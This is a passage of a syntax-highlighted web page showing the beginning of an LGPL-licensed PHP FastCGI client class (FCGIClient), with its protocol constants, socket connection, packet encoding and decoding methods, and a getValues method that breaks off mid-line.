class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VERSION_1</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">BEGIN_REQUEST</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ABORT_REQUEST</span>        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">END_REQUEST</span>          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PARAMS</span>               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDIN</span>                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDOUT</span>               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDERR</span>               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATA</span>                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES</span>           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES_RESULT</span>    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_TYPE</span>         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAXTYPE</span>              = <span class="built_in">self</span>::<span class="variable constant_">UNKNOWN_TYPE</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RESPONDER</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AUTHORIZER</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FILTER</span>               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">REQUEST_COMPLETE</span>     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">CANT_MPX_CONN</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OVERLOADED</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_ROLE</span>         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_CONNS</span>            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_REQS</span>             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MPXS_CONNS</span>           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">HEADER_LEN</span>           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_keepAlive &amp;&amp; <span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_sock = <span class="title function_ invoke__">stream_socket_client</span>(<span class="variable">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">chr</span>(<span class="built_in">self</span>::<span class="variable constant_">VERSION_1</span>)         <span class="comment">/* version */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="built_in">self</span>::<span class="variable constant_">HEADER_LEN</span>)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decodePacketHeader</span>(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= <span class="title function_ invoke__">strlen</span>(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildNvpair</span>(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">GET_VALUES</span>, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readPacket</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::<span class="variable constant_">GET_VALUES_RESULT</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNvpair</span>(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span 